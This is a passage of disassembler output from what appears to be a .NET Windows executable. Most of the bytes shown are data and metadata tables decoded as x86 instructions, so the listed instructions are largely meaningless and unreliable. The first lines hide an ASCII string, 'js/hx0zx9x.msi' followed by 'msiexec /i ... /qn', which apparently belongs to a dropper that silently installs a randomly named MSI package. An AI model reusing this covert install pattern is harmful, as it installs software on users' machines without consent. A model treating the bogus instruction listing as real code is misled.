  404abc:	6a 73                	push   $0x73
  404abe:	2f                   	das
  404abf:	68 78 30 7a 78       	push   $0x787a3078
  404ac4:	39 78 2e             	cmp    %edi,0x2e(%eax)
  404ac7:	6d                   	insl   (%dx),%es:(%edi)
  404ac8:	73 69                	jae    0x404b33
  404aca:	22 3b                	and    (%ebx),%bh
  404acc:	20 6d 73             	and    %ch,0x73(%ebp)
  404acf:	69 65 78 65 63 20 2f 	imul   $0x2f206365,0x78(%ebp),%esp
  404ad6:	69 20 22 24 66 6f    	imul   $0x6f662422,(%eax),%esp
  404adc:	6c                   	insb   (%dx),%es:(%edi)
  404add:	64 65 72 5c          	fs gs jb 0x404b3d
  404ae1:	68 78 30 7a 78       	push   $0x787a3078
  404ae6:	39 78 2e             	cmp    %edi,0x2e(%eax)
  404ae9:	6d                   	insl   (%dx),%es:(%edi)
  404aea:	73 69                	jae    0x404b55
  404aec:	22 20                	and    (%eax),%ah
  404aee:	2f                   	das
  404aef:	71 6e                	jno    0x404b5f
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 42 53             	add    %al,0x53(%edx)
  404af6:	4a                   	dec    %edx
  404af7:	42                   	inc    %edx
  404af8:	01 00                	add    %eax,(%eax)
  404afa:	01 00                	add    %eax,(%eax)
  404afc:	00 00                	add    %al,(%eax)
  404afe:	00 00                	add    %al,(%eax)
  404b00:	0c 00                	or     $0x0,%al
  404b02:	00 00                	add    %al,(%eax)
  404b04:	76 34                	jbe    0x404b3a
  404b06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404b09:	33 30                	xor    (%eax),%esi
  404b0b:	33 31                	xor    (%ecx),%esi
  404b0d:	39 00                	cmp    %eax,(%eax)
  404b0f:	00 00                	add    %al,(%eax)
  404b11:	00 05 00 6c 00 00    	add    %al,0x6c00
  404b17:	00 3c 1c             	add    %bh,(%esp,%ebx,1)
  404b1a:	00 00                	add    %al,(%eax)
  404b1c:	23 7e 00             	and    0x0(%esi),%edi
  404b1f:	00 a8 1c 00 00 a4    	add    %ch,-0x5bffffe4(%eax)
  404b25:	22 00                	and    (%eax),%al
  404b27:	00 23                	add    %ah,(%ebx)
  404b29:	53                   	push   %ebx
  404b2a:	74 72                	je     0x404b9e
  404b2c:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  404b33:	00 4c 3f 00          	add    %cl,0x0(%edi,%edi,1)
  404b37:	00 88 04 00 00 23    	add    %cl,0x23000004(%eax)
  404b3d:	55                   	push   %ebp
  404b3e:	53                   	push   %ebx
  404b3f:	00 d4                	add    %dl,%ah
  404b41:	43                   	inc    %ebx
  404b42:	00 00                	add    %al,(%eax)
  404b44:	10 00                	adc    %al,(%eax)
  404b46:	00 00                	add    %al,(%eax)
  404b48:	23 47 55             	and    0x55(%edi),%eax
  404b4b:	49                   	dec    %ecx
  404b4c:	44                   	inc    %esp
  404b4d:	00 00                	add    %al,(%eax)
  404b4f:	00 e4                	add    %ah,%ah
  404b51:	43                   	inc    %ebx
  404b52:	00 00                	add    %al,(%eax)
  404b54:	50                   	push   %eax
  404b55:	08 00                	or     %al,(%eax)
  404b57:	00 23                	add    %ah,(%ebx)
  404b59:	42                   	inc    %edx
  404b5a:	6c                   	insb   (%dx),%es:(%edi)
  404b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  404b5c:	62 00                	bound  %eax,(%eax)
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	00 00                	add    %al,(%eax)
  404b62:	00 00                	add    %al,(%eax)
  404b64:	02 00                	add    (%eax),%al
  404b66:	00 01                	add    %al,(%ecx)
  404b68:	57                   	push   %edi
  404b69:	3f                   	aas
  404b6a:	a2 1d 09 0b 00       	mov    %al,0xb091d
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	fa                   	cli
  404b72:	25 33 00 16 00       	and    $0x160033,%eax
  404b77:	00 01                	add    %al,(%ecx)
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 95 00 00 00 16    	add    %dl,0x16000000(%ebp)
  404b81:	00 00                	add    %al,(%eax)
  404b83:	00 59 00             	add    %bl,0x0(%ecx)
  404b86:	00 00                	add    %al,(%eax)
  404b88:	7d 00                	jge    0x404b8a
  404b8a:	00 00                	add    %al,(%eax)
  404b8c:	80 00 00             	addb   $0x0,(%eax)
  404b8f:	00 01                	add    %al,(%ecx)
  404b91:	00 00                	add    %al,(%eax)
  404b93:	00 1f                	add    %bl,(%edi)
  404b95:	01 00                	add    %eax,(%eax)
  404b97:	00 21                	add    %ah,(%ecx)
  404b99:	00 00                	add    %al,(%eax)
  404b9b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	02 00                	add    (%eax),%al
  404ba2:	00 00                	add    %al,(%eax)
  404ba4:	13 00                	adc    (%eax),%eax
  404ba6:	00 00                	add    %al,(%eax)
  404ba8:	06                   	push   %es
  404ba9:	00 00                	add    %al,(%eax)
  404bab:	00 21                	add    %ah,(%ecx)
  404bad:	00 00                	add    %al,(%eax)
  404baf:	00 37                	add    %dh,(%edi)
  404bb1:	00 00                	add    %al,(%eax)
  404bb3:	00 03                	add    %al,(%ebx)
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	00 0b                	add    %cl,(%ebx)
  404bb9:	00 00                	add    %al,(%eax)
  404bbb:	00 05 00 00 00 01    	add    %al,0x1000000
  404bc1:	00 00                	add    %al,(%eax)
  404bc3:	00 05 00 00 00 01    	add    %al,0x1000000
  404bc9:	00 00                	add    %al,(%eax)
  404bcb:	00 0a                	add    %cl,(%edx)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	00 00                	add    %al,(%eax)
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 0a                	add    %cl,(%edx)
  404bd7:	00 01                	add    %al,(%ecx)
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	00 06                	add    %al,(%esi)
  404bdf:	00 39                	add    %bh,(%ecx)
  404be1:	01 32                	add    %esi,(%edx)
  404be3:	01 06                	add    %eax,(%esi)
  404be5:	00 40 01             	add    %al,0x1(%eax)
  404be8:	32 01                	xor    (%ecx),%al
  404bea:	06                   	push   %es
  404beb:	00 4a 01             	add    %cl,0x1(%edx)
  404bee:	32 01                	xor    (%ecx),%al
  404bf0:	0a 00                	or     (%eax),%al
  404bf2:	8e 01                	mov    (%ecx),%es
  404bf4:	6c                   	insb   (%dx),%es:(%edi)
  404bf5:	01 0e                	add    %ecx,(%esi)
  404bf7:	00 ba 01 a5 01 0a    	add    %bh,0xa01a501(%edx)
  404bfd:	00 bf 01 6c 01 0a    	add    %bh,0xa016c01(%edi)
  404c03:	00 d3                	add    %dl,%bl
  404c05:	01 6c 01 06          	add    %ebp,0x6(%ecx,%eax,1)
  404c09:	00 e6                	add    %ah,%dh
  404c0b:	01 da                	add    %ebx,%edx
  404c0d:	01 0a                	add    %ecx,(%edx)
  404c0f:	00 0f                	add    %cl,(%edi)
  404c11:	02 4f 01             	add    0x1(%edi),%cl
  404c14:	0a 00                	or     (%eax),%al
  404c16:	21 02                	and    %eax,(%edx)
  404c18:	4f                   	dec    %edi
  404c19:	01 06                	add    %eax,(%esi)
  404c1b:	00 83 04 32 01 0a    	add    %al,0xa013204(%ebx)
  404c21:	00 de                	add    %bl,%dh
  404c23:	04 6c                	add    $0x6c,%al
  404c25:	01 0a                	add    %ecx,(%edx)
  404c27:	00 01                	add    %al,(%ecx)
  404c29:	05 6c 01 0a 00       	add    $0xa016c,%eax
  404c2e:	99                   	cltd
  404c2f:	05 6c 01 0a 00       	add    $0xa016c,%eax
  404c34:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404c35:	05 6c 01 0a 00       	add    $0xa016c,%eax
  404c3a:	fd                   	std
  404c3b:	05 6c 01 0a 00       	add    $0xa016c,%eax
  404c40:	05 06 6c 01 0e       	add    $0xe016c06,%eax
  404c45:	00 50 07             	add    %dl,0x7(%eax)
  404c48:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c49:	01 06                	add    %eax,(%esi)
  404c4b:	00 81 07 62 07 0a    	add    %al,0xa076207(%ecx)
  404c51:	00 8e 07 6c 01 0e    	add    %cl,0xe016c07(%esi)
  404c57:	00 aa 07 a5 01 0e    	add    %ch,0xe01a507(%edx)
  404c5d:	00 d4                	add    %dl,%ah
  404c5f:	07                   	pop    %es
  404c60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404c61:	01 12                	add    %edx,(%edx)
  404c63:	00 2a                	add    %ch,(%edx)
  404c65:	08 1c 08             	or     %bl,(%eax,%ecx,1)
  404c68:	06                   	push   %es
  404c69:	00 6b 08             	add    %ch,0x8(%ebx)
  404c6c:	50                   	push   %eax
  404c6d:	08 16                	or     %dl,(%esi)
  404c6f:	00 92 08 83 08 12    	add    %dl,0x12088308(%edx)
  404c75:	00 b9 08 1c 08 0a    	add    %bh,0xa081c08(%ecx)
  404c7b:	00 e3                	add    %ah,%bl
  404c7d:	08 4f 01             	or     %cl,0x1(%edi)
  404c80:	0e                   	push   %cs
  404c81:	00 f9                	add    %bh,%cl
  404c83:	08 a5 01 0e 00 13    	or     %ah,0x13000e01(%ebp)
  404c89:	09 a5 01 06 00 26    	or     %esp,0x26000601(%ebp)
  404c8f:	0b 50 08             	or     0x8(%eax),%edx
  404c92:	0a 00                	or     (%eax),%al
  404c94:	33 0b                	xor    (%ebx),%ecx
  404c96:	4f                   	dec    %edi
  404c97:	01 0a                	add    %ecx,(%edx)
  404c99:	00 3c 0b             	add    %bh,(%ebx,%ecx,1)
  404c9c:	6c                   	insb   (%dx),%es:(%edi)
  404c9d:	01 0a                	add    %ecx,(%edx)
  404c9f:	00 64 0b 4f          	add    %ah,0x4f(%ebx,%ecx,1)
  404ca3:	01 06                	add    %eax,(%esi)
  404ca5:	00 be 0b ae 0b 06    	add    %bh,0x60bae0b(%esi)
  404cab:	00 74 0c 5f          	add    %dh,0x5f(%esp,%ecx,1)
  404caf:	0c 06                	or     $0x6,%al
  404cb1:	00 aa 0c 32 01 06    	add    %ch,0x601320c(%edx)
  404cb7:	00 1e                	add    %bl,(%esi)
  404cb9:	0d 32 01 06 00       	or     $0x60132,%eax
  404cbe:	47                   	inc    %edi
  404cbf:	10 32                	adc    %dh,(%edx)
  404cc1:	01 06                	add    %eax,(%esi)
  404cc3:	00 f9                	add    %bh,%cl
  404cc5:	10 da                	adc    %bl,%dl
  404cc7:	10 06                	adc    %al,(%esi)
  404cc9:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  404ccc:	da 10                	ficoml (%eax)
  404cce:	06                   	push   %es
  404ccf:	00 f0                	add    %dh,%al
  404cd1:	11 da                	adc    %ebx,%edx
  404cd3:	10 06                	adc    %al,(%esi)
  404cd5:	00 f5                	add    %dh,%ch
  404cd7:	12 e3                	adc    %bl,%ah
  404cd9:	12 06                	adc    (%esi),%al
  404cdb:	00 0c 13             	add    %cl,(%ebx,%edx,1)
  404cde:	e3 12                	jecxz  0x404cf2
  404ce0:	06                   	push   %es
  404ce1:	00 25 13 e3 12 06    	add    %ah,0x612e313
  404ce7:	00 40 13             	add    %al,0x13(%eax)
  404cea:	e3 12                	jecxz  0x404cfe
  404cec:	06                   	push   %es
  404ced:	00 5b 13             	add    %bl,0x13(%ebx)
  404cf0:	e3 12                	jecxz  0x404d04
  404cf2:	06                   	push   %es
  404cf3:	00 74 13 e3          	add    %dh,-0x1d(%ebx,%edx,1)
  404cf7:	12 06                	adc    (%esi),%al
  404cf9:	00 91 13 e3 12 06    	add    %dl,0x612e313(%ecx)
  404cff:	00 ae 13 e3 12 06    	add    %ch,0x612e313(%esi)
  404d05:	00 e7                	add    %ah,%bh
  404d07:	13 c7                	adc    %edi,%eax
  404d09:	13 06                	adc    (%esi),%eax
  404d0b:	00 07                	add    %al,(%edi)
  404d0d:	14 c7                	adc    $0xc7,%al
  404d0f:	13 06                	adc    (%esi),%eax
  404d11:	00 2d 14 da 10 06    	add    %ch,0x610da14
  404d17:	00 47 14             	add    %al,0x14(%edi)
  404d1a:	32 01                	xor    (%ecx),%al
  404d1c:	06                   	push   %es
  404d1d:	00 5c 14 da          	add    %bl,-0x26(%esp,%edx,1)
  404d21:	10 06                	adc    %al,(%esi)
  404d23:	00 6b 14             	add    %ch,0x14(%ebx)
  404d26:	32 01                	xor    (%ecx),%al
  404d28:	06                   	push   %es
  404d29:	00 80 14 da 10 06    	add    %al,0x610da14(%eax)
  404d2f:	00 96 14 da 10 06    	add    %dl,0x610da14(%esi)
  404d35:	00 a1 14 32 01 0e    	add    %ah,0xe013214(%ecx)
  404d3b:	00 da                	add    %bl,%dl
  404d3d:	14 a5                	adc    $0xa5,%al
  404d3f:	01 0a                	add    %ecx,(%edx)
  404d41:	00 1c 15 6c 01 06 00 	add    %bl,0x6016c(,%edx,1)
  404d48:	4c                   	dec    %esp
  404d49:	15 32 01 16 00       	adc    $0x160132,%eax
  404d4e:	84 15 83 08 0e 00    	test   %dl,0xe0883
  404d54:	8a 15 a5 01 0e 00    	mov    0xe01a5,%dl
  404d5a:	b3 15                	mov    $0x15,%bl
  404d5c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d5d:	01 0e                	add    %ecx,(%esi)
  404d5f:	00 d3                	add    %dl,%bl
  404d61:	15 a5 01 0e 00       	adc    $0xe01a5,%eax
  404d66:	db 15 a5 01 16 00    	fistl  0x1601a5
  404d6c:	eb 15                	jmp    0x404d83
  404d6e:	83 08 0e             	orl    $0xe,(%eax)
  404d71:	00 fe                	add    %bh,%dh
  404d73:	15 a5 01 16 00       	adc    $0x1601a5,%eax
  404d78:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404d79:	05 83 08 16 00       	add    $0x160883,%eax
  404d7e:	de 04 83             	fiadds (%ebx,%eax,4)
  404d81:	08 ef                	or     %ch,%bh
  404d83:	00 43 16             	add    %al,0x16(%ebx)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	06                   	push   %es
  404d89:	00 aa 16 32 01 0e    	add    %ch,0xe013216(%edx)
  404d8f:	00 cb                	add    %cl,%bl
  404d91:	16                   	push   %ss
  404d92:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d93:	01 0e                	add    %ecx,(%esi)
  404d95:	00 ef                	add    %ch,%bh
  404d97:	16                   	push   %ss
  404d98:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d99:	01 06                	add    %eax,(%esi)
  404d9b:	00 13                	add    %dl,(%ebx)
  404d9d:	17                   	pop    %ss
  404d9e:	e3 12                	jecxz  0x404db2
  404da0:	16                   	push   %ss
  404da1:	00 3e                	add    %bh,(%esi)
  404da3:	17                   	pop    %ss
  404da4:	83 08 0e             	orl    $0xe,(%eax)
  404da7:	00 82 17 a5 01 0e    	add    %al,0xe01a517(%edx)
  404dad:	00 d1                	add    %dl,%cl
  404daf:	17                   	pop    %ss
  404db0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404db1:	01 0e                	add    %ecx,(%esi)
  404db3:	00 dd                	add    %bl,%ch
  404db5:	17                   	pop    %ss
  404db6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404db7:	01 06                	add    %eax,(%esi)
  404db9:	00 e5                	add    %ah,%ch
  404dbb:	17                   	pop    %ss
  404dbc:	50                   	push   %eax
  404dbd:	08 06                	or     %al,(%esi)
  404dbf:	00 5c 18 49          	add    %bl,0x49(%eax,%ebx,1)
  404dc3:	18 06                	sbb    %al,(%esi)
  404dc5:	00 71 18             	add    %dh,0x18(%ecx)
  404dc8:	32 01                	xor    (%ecx),%al
  404dca:	06                   	push   %es
  404dcb:	00 a0 18 32 01 0e    	add    %ah,0xe013218(%eax)
  404dd1:	00 a5 18 a5 01 0a    	add    %ah,0xa01a518(%ebp)
  404dd7:	00 39                	add    %bh,(%ecx)
  404dd9:	19 6c 01 16          	sbb    %ebp,0x16(%ecx,%eax,1)
  404ddd:	00 9c 19 83 08 0e 00 	add    %bl,0xe0883(%ecx,%ebx,1)
  404de4:	ec                   	in     (%dx),%al
  404de5:	19 a5 01 12 00 37    	sbb    %esp,0x37001201(%ebp)
  404deb:	1a 1c 08             	sbb    (%eax,%ecx,1),%bl
  404dee:	16                   	push   %ss
  404def:	00 a4 1a 83 08 16 00 	add    %ah,0x160883(%edx,%ebx,1)
  404df6:	b2 1a                	mov    $0x1a,%dl
  404df8:	83 08 0e             	orl    $0xe,(%eax)
  404dfb:	00 c5                	add    %al,%ch
  404dfd:	1a a5 01 0a 00 06    	sbb    0x6000a01(%ebp),%ah
  404e03:	1b 4f 01             	sbb    0x1(%edi),%ecx
  404e06:	12 00                	adc    (%eax),%al
  404e08:	45                   	inc    %ebp
  404e09:	1b 2f                	sbb    (%edi),%ebp
  404e0b:	1b 06                	sbb    (%esi),%eax
  404e0d:	00 c5                	add    %al,%ch
  404e0f:	1b 32                	sbb    (%edx),%esi
  404e11:	01 06                	add    %eax,(%esi)
  404e13:	00 dd                	add    %bl,%ch
  404e15:	1b 32                	sbb    (%edx),%esi
  404e17:	01 0e                	add    %ecx,(%esi)
  404e19:	00 1e                	add    %bl,(%esi)
  404e1b:	1c a5                	sbb    $0xa5,%al
  404e1d:	01 0e                	add    %ecx,(%esi)
  404e1f:	00 40 1c             	add    %al,0x1c(%eax)
  404e22:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404e23:	01 06                	add    %eax,(%esi)
  404e25:	00 69 1c             	add    %ch,0x1c(%ecx)
  404e28:	32 01                	xor    (%ecx),%al
  404e2a:	06                   	push   %es
  404e2b:	00 6e 1c             	add    %ch,0x1c(%esi)
  404e2e:	32 01                	xor    (%ecx),%al
  404e30:	06                   	push   %es
  404e31:	00 b5 1c 32 01 06    	add    %dh,0x601321c(%ebp)
  404e37:	00 d5                	add    %dl,%ch
  404e39:	1c e3                	sbb    $0xe3,%al
  404e3b:	12 06                	adc    (%esi),%al
  404e3d:	00 e5                	add    %ah,%ch
  404e3f:	1c e3                	sbb    $0xe3,%al
  404e41:	12 06                	adc    (%esi),%al
  404e43:	00 f2                	add    %dh,%dl
  404e45:	1c e3                	sbb    $0xe3,%al
  404e47:	12 06                	adc    (%esi),%al
  404e49:	00 f9                	add    %bh,%cl
  404e4b:	1c e3                	sbb    $0xe3,%al
  404e4d:	12 06                	adc    (%esi),%al
  404e4f:	00 21                	add    %ah,(%ecx)
  404e51:	1d 32 01 06 00       	sbb    $0x60132,%eax
  404e56:	41                   	inc    %ecx
  404e57:	1d 32 01 06 00       	sbb    $0x60132,%eax
  404e5c:	72 1d                	jb     0x404e7b
  404e5e:	32 01                	xor    (%ecx),%al
  404e60:	06                   	push   %es
  404e61:	00 93 1d 32 01 06    	add    %dl,0x601321d(%ebx)
  404e67:	00 9b 1d 32 01 06    	add    %bl,0x601321d(%ebx)
  404e6d:	00 aa 1d 32 01 06    	add    %ch,0x601321d(%edx)
  404e73:	00 e5                	add    %ah,%ch
  404e75:	1d d4 1d 06 00       	sbb    $0x61dd4,%eax
  404e7a:	11 1e                	adc    %ebx,(%esi)
  404e7c:	32 01                	xor    (%ecx),%al
  404e7e:	06                   	push   %es
  404e7f:	00 27                	add    %ah,(%edi)
  404e81:	1e                   	push   %ds
  404e82:	32 01                	xor    (%ecx),%al
  404e84:	06                   	push   %es
  404e85:	00 4d 1e             	add    %cl,0x1e(%ebp)
  404e88:	d4 1d                	aam    $0x1d
  404e8a:	0a 00                	or     (%eax),%al
  404e8c:	62 1e                	bound  %ebx,(%esi)
  404e8e:	4f                   	dec    %edi
  404e8f:	01 06                	add    %eax,(%esi)
  404e91:	00 8b 1e 32 01 0a    	add    %cl,0xa01321e(%ebx)
  404e97:	00 a6 1e 4f 01 0a    	add    %ah,0xa014f1e(%esi)
  404e9d:	00 b9 1e 4f 01 06    	add    %bh,0x6014f1e(%ecx)
  404ea3:	00 f9                	add    %bh,%cl
  404ea5:	1e                   	push   %ds
  404ea6:	d4 1d                	aam    $0x1d
  404ea8:	06                   	push   %es
  404ea9:	00 20                	add    %ah,(%eax)
  404eab:	1f                   	pop    %ds
  404eac:	32 01                	xor    (%ecx),%al
  404eae:	0a 00                	or     (%eax),%al
  404eb0:	7d 1f                	jge    0x404ed1
  404eb2:	56                   	push   %esi
  404eb3:	1f                   	pop    %ds
  404eb4:	0a 00                	or     (%eax),%al
  404eb6:	8d 1f                	lea    (%edi),%ebx
  404eb8:	56                   	push   %esi
  404eb9:	1f                   	pop    %ds
  404eba:	06                   	push   %es
  404ebb:	00 a5 1f d4 1d 0a    	add    %ah,0xa1dd41f(%ebp)
  404ec1:	00 cc                	add    %cl,%ah
  404ec3:	1f                   	pop    %ds
  404ec4:	4f                   	dec    %edi
  404ec5:	01 0a                	add    %ecx,(%edx)
  404ec7:	00 eb                	add    %ch,%bl
  404ec9:	1f                   	pop    %ds
  404eca:	4f                   	dec    %edi
  404ecb:	01 06                	add    %eax,(%esi)
  404ecd:	00 0f                	add    %cl,(%edi)
  404ecf:	20 32                	and    %dh,(%edx)
  404ed1:	01 06                	add    %eax,(%esi)
  404ed3:	00 3d 20 32 01 06    	add    %bh,0x6013220
  404ed9:	00 59 20             	add    %bl,0x20(%ecx)
  404edc:	32 01                	xor    (%ecx),%al
  404ede:	0e                   	push   %cs
  404edf:	00 72 20             	add    %dh,0x20(%edx)
  404ee2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404ee3:	01 0e                	add    %ecx,(%esi)
  404ee5:	00 84 20 a5 01 06 00 	add    %al,0x601a5(%eax,%eiz,1)
  404eec:	ab                   	stos   %eax,%es:(%edi)
  404eed:	20 98 20 06 00 c5    	and    %bl,-0x3afff9e0(%eax)
  404ef3:	20 bb 20 06 00 e6    	and    %bh,-0x19fff9e0(%ebx)
  404ef9:	20 da                	and    %bl,%dl
  404efb:	01 06                	add    %eax,(%esi)
  404efd:	00 f8                	add    %bh,%al
  404eff:	20 bb 20 06 00 05    	and    %bh,0x5000620(%ebx)
  404f05:	21 bb 20 06 00 1a    	and    %edi,0x1a000620(%ebx)
  404f0b:	21 bb 20 12 00 55    	and    %edi,0x55001220(%ebx)
  404f11:	21 36                	and    %esi,(%esi)
  404f13:	21 12                	and    %edx,(%edx)
  404f15:	00 5b 21             	add    %bl,0x21(%ebx)
  404f18:	36 21 12             	and    %edx,%ss:(%edx)
  404f1b:	00 61 21             	add    %ah,0x21(%ecx)
  404f1e:	36 21 12             	and    %edx,%ss:(%edx)
  404f21:	00 73 21             	add    %dh,0x21(%ebx)
  404f24:	36 21 06             	and    %eax,%ss:(%esi)
  404f27:	00 8e 21 32 01 12    	add    %cl,0x12013221(%esi)
  404f2d:	00 ab 21 36 21 06    	add    %ch,0x6213621(%ebx)
  404f33:	00 c5                	add    %al,%ch
  404f35:	21 32                	and    %esi,(%edx)
  404f37:	01 06                	add    %eax,(%esi)
  404f39:	00 e4                	add    %ah,%ah
  404f3b:	21 32                	and    %esi,(%edx)
  404f3d:	01 0a                	add    %ecx,(%edx)
  404f3f:	00 f2                	add    %dh,%dl
  404f41:	21 4f 01             	and    %ecx,0x1(%edi)
  404f44:	06                   	push   %es
  404f45:	00 13                	add    %dl,(%ebx)
  404f47:	22 d4                	and    %ah,%dl
  404f49:	1d 0a 00 26 22       	sbb    $0x2226000a,%eax
  404f4e:	4f                   	dec    %edi
  404f4f:	01 0a                	add    %ecx,(%edx)
  404f51:	00 54 22 4f          	add    %dl,0x4f(%edx,%eiz,1)
  404f55:	01 06                	add    %eax,(%esi)
  404f57:	00 7b 22             	add    %bh,0x22(%ebx)
  404f5a:	c7                   	(bad)
  404f5b:	13 00                	adc    (%eax),%eax
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 01                	add    %al,(%ecx)
  404f61:	00 00                	add    %al,(%eax)
  404f63:	00 00                	add    %al,(%eax)
  404f65:	00 01                	add    %al,(%ecx)
  404f67:	00 01                	add    %al,(%ecx)
  404f69:	00 00                	add    %al,(%eax)
  404f6b:	00 10                	add    %dl,(%eax)
  404f6d:	00 16                	add    %dl,(%esi)
  404f6f:	00 26                	add    %ah,(%esi)
  404f71:	00 05 00 01 00 01    	add    %al,0x1000100
  404f77:	00 0b                	add    %cl,(%ebx)
  404f79:	01 11                	add    %edx,(%ecx)
  404f7b:	00 36                	add    %dh,(%esi)
  404f7d:	00 00                	add    %al,(%eax)
  404f7f:	00 09                	add    %cl,(%ecx)
  404f81:	00 01                	add    %al,(%ecx)
  404f83:	00 04 00             	add    %al,(%eax,%eax,1)
  404f86:	03 01                	add    (%ecx),%eax
  404f88:	00 00                	add    %al,(%eax)
  404f8a:	42                   	inc    %edx
  404f8b:	00 00                	add    %al,(%eax)
  404f8d:	00 0d 00 06 00 04    	add    %cl,0x4000600
  404f93:	00 02                	add    %al,(%edx)
  404f95:	01 00                	add    %eax,(%eax)
  404f97:	00 4f 00             	add    %cl,0x0(%edi)
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	0d 00 18 00 04       	or     $0x4001800,%eax
  404fa1:	00 02                	add    %al,(%edx)
  404fa3:	00 10                	add    %dl,(%eax)
  404fa5:	00 62 00             	add    %ah,0x0(%edx)
  404fa8:	00 00                	add    %al,(%eax)
  404faa:	05 00 21 00 04       	add    $0x4002100,%eax
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	00 10                	add    %dl,(%eax)
  404fb3:	00 6b 00             	add    %ch,0x0(%ebx)
  404fb6:	26 00 11             	add    %dl,%es:(%ecx)
  404fb9:	00 24 00             	add    %ah,(%eax,%eax,1)
  404fbc:	05 00 01 00 10       	add    $0x10000100,%eax
  404fc1:	00 7b 00             	add    %bh,0x0(%ebx)
  404fc4:	26 00 05 00 27 00 1f 	add    %al,%es:0x1f002700
  404fcb:	00 01                	add    %al,(%ecx)
  404fcd:	00 10                	add    %dl,(%eax)
  404fcf:	00 85 00 26 00 05    	add    %al,0x5002600(%ebp)
  404fd5:	00 27                	add    %ah,(%edi)
  404fd7:	00 23                	add    %ah,(%ebx)
  404fd9:	00 01                	add    %al,(%ecx)
  404fdb:	00 10                	add    %dl,(%eax)
  404fdd:	00 90 00 26 00 05    	add    %dl,0x5002600(%eax)
  404fe3:	00 27                	add    %ah,(%edi)
  404fe5:	00 25 00 03 00 10    	add    %ah,0x10000300
  404feb:	00 9c 00 00 00 15 00 	add    %bl,0x150000(%eax,%eax,1)
  404ff2:	27                   	daa
  404ff3:	00 29                	add    %ch,(%ecx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 10                	add    %dl,(%eax)
  404ff9:	00 aa 00 26 00 15    	add    %ch,0x15002600(%edx)
  404fff:	00 29                	add    %ch,(%ecx)
  405001:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405004:	0b 01                	or     (%ecx),%eax
  405006:	10 00                	adc    %al,(%eax)
  405008:	b8 00 00 00 09       	mov    $0x9000000,%eax
  40500d:	00 2f                	add    %ch,(%edi)
  40500f:	00 34 00             	add    %dh,(%eax,%eax,1)
  405012:	01 00                	add    %eax,(%eax)
  405014:	10 00                	adc    %al,(%eax)
  405016:	c6 00 26             	movb   $0x26,(%eax)
  405019:	00 05 00 37 00 34    	add    %al,0x34003700
  40501f:	00 03                	add    %al,(%ebx)
  405021:	01 00                	add    %eax,(%eax)
  405023:	00 d3                	add    %dl,%bl
  405025:	00 00                	add    %al,(%eax)
  405027:	00 0d 00 37 00 3a    	add    %cl,0x3a003700
  40502d:	00 03                	add    %al,(%ebx)
  40502f:	01 00                	add    %eax,(%eax)
  405031:	00 dc                	add    %bl,%ah
  405033:	00 00                	add    %al,(%eax)
  405035:	00 0d 00 3d 00 3a    	add    %cl,0x3a003d00
  40503b:	00 00                	add    %al,(%eax)
  40503d:	00 10                	add    %dl,(%eax)
  40503f:	00 e6                	add    %ah,%dh
  405041:	00 26                	add    %ah,(%esi)
  405043:	00 19                	add    %bl,(%ecx)
  405045:	00 41 00             	add    %al,0x0(%ecx)
  405048:	3a 00                	cmp    (%eax),%al
  40504a:	00 00                	add    %al,(%eax)
  40504c:	10 00                	adc    %al,(%eax)
  40504e:	f3 00 26             	repz add %ah,(%esi)
  405051:	00 1d 00 4f 00 4d    	add    %bl,0x4d004f00
  405057:	00 02                	add    %al,(%edx)
  405059:	00 10                	add    %dl,(%eax)
  40505b:	00 fe                	add    %bh,%dh
  40505d:	00 00                	add    %al,(%eax)
  40505f:	00 05 00 55 00 5a    	add    %al,0x5a005500
  405065:	00 a0 00 00 00 10    	add    %ah,0x10000000(%eax)
  40506b:	01 26                	add    %esp,(%esi)
  40506d:	00 00                	add    %al,(%eax)
  40506f:	00 56 00             	add    %dl,0x0(%esi)
  405072:	6f                   	outsl  %ds:(%esi),(%dx)
  405073:	00 00                	add    %al,(%eax)
  405075:	00 10                	add    %dl,(%eax)
  405077:	00 21                	add    %ah,(%ecx)
  405079:	01 26                	add    %esp,(%esi)
  40507b:	00 05 00 56 00 73    	add    %al,0x73005600
  405081:	00 03                	add    %al,(%ebx)
  405083:	01 10                	add    %edx,(%eax)
  405085:	00 3a                	add    %bh,(%edx)
  405087:	1e                   	push   %ds
  405088:	00 00                	add    %al,(%eax)
  40508a:	05 00 58 00 7a       	add    $0x7a005800,%eax
  40508f:	00 06                	add    %al,(%esi)
  405091:	00 4f 02             	add    %cl,0x2(%edi)
  405094:	39 00                	cmp    %eax,(%eax)
  405096:	06                   	push   %es
  405097:	00 56 02             	add    %dl,0x2(%esi)
  40509a:	3c 00                	cmp    $0x0,%al
  40509c:	06                   	push   %es
  40509d:	00 61 02             	add    %ah,0x2(%ecx)
  4050a0:	3f                   	aas
  4050a1:	00 06                	add    %al,(%esi)
